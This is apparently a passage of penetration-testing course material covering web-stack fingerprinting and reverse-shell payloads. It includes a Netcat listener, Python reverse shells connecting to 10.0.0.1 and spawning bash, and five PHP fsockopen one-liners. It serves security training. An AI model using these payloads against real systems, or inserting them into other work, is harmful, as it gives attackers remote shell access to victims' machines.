#### 2.8.1. Web Technology

When learning about shells, especially those which are received via the _web surface_, we need to first understand which web technology we're working with in order to receive a shell. The web technology manages the shell execution on our behalf.

When we perform an action within a web application, we commonly send our input to the back end. The back end is also sometimes referred to as the _web stack_ or _solutions stack_.[1](https://portal.offsec.com/courses/web-200-28380/learning/tools-30966/shells-31313/shells-31434#fn-local_id_147-1) A web application may also commonly be comprised of a combination of web technologies.

We have many methods for determining a web service's technology, and which option to choose comes with time and experience. Our methods include examining scan output, install/Readme/license files, source code, copyright date, file extensions, and more. These are common locations we can check to discover what types of web technologies a web server is using. In some cases, we can also retrieve version numbers.

---------

#### 2.8.2. Choosing the Correct Shell

From a red-team perspective, identifying a target machine's web technologies and operating system is considered an extremely helpful capability. For example, if Bash is present, we might be able to leverage it to achieve a reverse shell.

Security professionals have developed a wide variety of methods for leveraging web technologies and binaries to achieve code execution and, ultimately, obtain a shell. Because each of the commands we execute is a binary or executable file on the target machine, we will need to carefully consider each possible binary as something that we may be able to leverage via web permissions to obtain control over the machine. What we mean by this, is that if we're executing system commands, it's always a good idea to know which of those binaries or commands we can execute to gain greater control of the machine.

In the next section, we will review how we can use these capabilities and ensure our payloads are properly encoded to exclude bad characters.

#### 2.8.3. Payloads

In computer security, a `Payload` refers to the portion of a message that is intended for a destination.[1](https://portal.offsec.com/courses/web-200-28380/learning/tools-30966/shells-31313/choosing-the-correct-shell-31072#fn-local_id_153-1) In computer viruses and worms, the payload is the malware portion that performs or executes a specific set of actions.

One such type of shell that we can use is known as a `reverse shell`. From a TCP perspective, we will receive our shell as `inbound` traffic. That is to say, that we will establish a `listener` or `handler` (often with Netcat or Meterpreter), which expects the shell's TCP connection from outside our attacking machine.

In most cases, to execute a reverse shell payload, we only need to change our IP address and the port we'll be listening on.

We can think of Netcat[2](https://portal.offsec.com/courses/web-200-28380/learning/tools-30966/shells-31313/choosing-the-correct-shell-31072#fn-local_id_153-2) as our "Swiss Army Knife" when performing penetration testing services. With Netcat, we can perform a wide variety of actions, most of which are beyond the scope of this course. However, two such techniques we will be utilizing with Netcat include file transfer and establishing a listener to receive an incoming shell.

For example, for each of the payloads below, we would first establish a Netcat listener on port 80, or any port of our choosing on our attacking machine, thus ensuring we're ready to receive an incoming TCP connection.

```bash
kali@kali:~$ nc -lvp 80            
listening on [any] 80 ...
```

#### Python
It's worthwhile to view these types of shell commands as _payloads_ regardless of the web technology (PHP, ASP, JSP, etc).
Now that we have established a Netcat listener for our attacking machine, let's cover an example payload with Python on our target machine, `http://execsandbox:80/`.

We will need to replace the IP address in our command below with the IP of our attacking machine.
Before pasting this payload for a reverse shell into the vulnerable web application, let's understand what's happening with this Python code.
import socket,subprocess,os; instructs Python to immediately `import` the modules needed to interact with the operating system and establish a valid TCP connection.

By using `s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`, we declare a variable called `"s"` (short for TCP socket) and set the value as the main function of our imported socket module.

Our payload analysis reveals the following:

```bash
import socket
import subprocess
import os
import pty;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0)

os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

pty.spawn("/bin/bash")
```

The code above connects back to our chosen IP address and port number while spawning a valid `TTY shell` capable of execution.

A `TTY`,[3](https://portal.offsec.com/courses/web-200-28380/learning/tools-30966/shells-31313/payloads-31079#fn-local_id_153-3) stands for "TeleTYpewriter" and will permit us to perform standard input and output operations through our terminal.

After we receive a shell, it's a good habit for us to type the command tty and confirm whether we have a valid TTY (i.e. /dev/pts/0). It's important to realize that we want a valid TTY to make certain that when performing execution on a target machine (such as executing a payload), we will be able to do so without receiving errors.

Next, let's examine a different Python reverse shell payload.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

When executed on a target machine that has Python installed, the above one-liner will provide us a shell on port 80.

#### PHP

Let's now consider a victim's machine with a web server running PHP. We have a few options available for PHP code execution.

We'll cover multiple options in this case because PHP may have most (if not all) of the relevant functions disabled unless required by the application. It's wise to try each of these methods before moving on.

We can better understand the below series of one-liner payloads by running php -r '$sock=fsockopen("10.0.0.1",80); and simply examining what happens after execution. In the first example, the _exec()_[4](https://portal.offsec.com/courses/web-200-28380/learning/tools-30966/shells-31313/payloads-31079#fn-local_id_153-4) function executes a command via a shell and returns its output as a string.

Similarly, the payload using _system()_[5](https://portal.offsec.com/courses/web-200-28380/learning/tools-30966/shells-31313/payloads-31079#fn-local_id_153-5) also executes a command and displays its output. In the _passthru()_[6](https://portal.offsec.com/courses/web-200-28380/learning/tools-30966/shells-31313/payloads-31079#fn-local_id_153-6) example, we can execute an external program and display the output as _raw_. Much like the prior PHP execution functions, _shell_exec_[7](https://portal.offsec.com/courses/web-200-28380/learning/tools-30966/shells-31313/payloads-31079#fn-local_id_153-7) will execute a command via a shell and return the complete output as a string.

The final example payload is a bit more complex (pOpen); however its premise is the same as _exec_; we execute a command utilizing the function and receive the output of the command.

```php
php -r '$sock=fsockopen("10.0.0.1",80);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```